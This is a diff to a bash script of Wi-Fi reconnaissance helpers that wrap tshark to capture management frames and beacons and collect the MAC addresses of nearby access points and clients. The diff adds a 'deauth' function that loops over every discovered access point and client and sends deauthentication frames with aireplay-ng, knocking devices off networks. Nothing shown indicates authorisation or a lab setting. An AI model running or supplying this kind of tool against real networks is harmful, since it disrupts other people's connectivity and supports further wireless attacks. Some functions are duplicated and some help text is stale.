@@ -30,13 +30,26 @@ wlan(){
     sudo iwconfig wlan0
 }
 
-beacons(){
-    tshark -n -i "$wifi_interface" "$filter_my_mac" -f "subtype probereq" > probes.cap 2>tshark.log &
-    spot
+frames(){
+    tshark -n -i "$wifi_interface" "$filter_my_mac" -f "type mgt" -f "not subtype beacon" \
+        > mgt.cap 2>tshark.log &
+}
+
+aplist(){
+    tshark -n -i "$wifi_interface" -f "type mgt subtype beacon" \
+        > beacons.cap 2>tshark.log &
+}
+
+aps(){
+    grep -io '[0-9a-f:]\{17\}' beacons.cap | sort -u | sed 's|ff:ff:ff:ff:ff:ff||g' | tee routers.txt
+}
+
+approbe(){
+    grep -io '[0-9a-f:]\{17\}' beacons.cap | sort -u | sed 's|ff:ff:ff:ff:ff:ff||g' | tee routers.txt
 }
 
 macs(){
-    grep -io '[0-9a-f:]\{17\}' probes.cap | sort -u
+    grep -io '[0-9a-f:]\{17\}' mgt.cap | sort -u | sed 's|ff:ff:ff:ff:ff:ff||g' | tee macs.txt
 }
 
 macprobe(){
@@ -44,12 +57,26 @@ macprobe(){
     for mac in $unique_macs; do
         echo "Probing for beacon information from $mac"
         output_file=$(echo "$mac" | tr -d ":").mac
-        tshark -n -i "$wifi_interface" -f "ether host $mac" -f "subtype probereq" -c 1 | tee "$output_file"
+        tshark -n -i "$wifi_interface" -f "ether host $mac" -f "subtype probereq" -c 1 \
+            | tee "$output_file"
+    done
+}
+
+deauth(){
+    unique_macs=$(macs)
+    ap_mac=$(approbe)
+    for ap in $ap_mac; do
+        for mac in $unique_macs; do
+            echo "Probing for beacon information from $mac"
+            output_file=$(echo "$mac" | tr -d ":").deauth
+            sudo aireplay-ng -0 1 -a "$ap" -c "$mac" "$wifi_interface" \
+                | tee "$output_file"
+        done
     done
 }
 
 spot(){
-    tail -f probes.cap
+    tail -f mgt.cap
 }
 
 tshark_assist(){
@@ -57,8 +84,8 @@ tshark_assist(){
     echo " monitor -put your card into Monitor Mode"
     echo " client -put your card into Managed Client Mode"
     echo " wlan -check the wireless card's mode"
-    echo " beacons -capture wireless management frams in probes.cap"
+    echo " beacons -capture wireless management frams in mgt.cap"
     echo " macs -identify unique mac addresses and list them"
     echo " macprobe -identify and gather information about uniqe addresses"
-    echo " spot -follow probes.cap output"
+    echo " spot -follow mgt.cap output"
 }
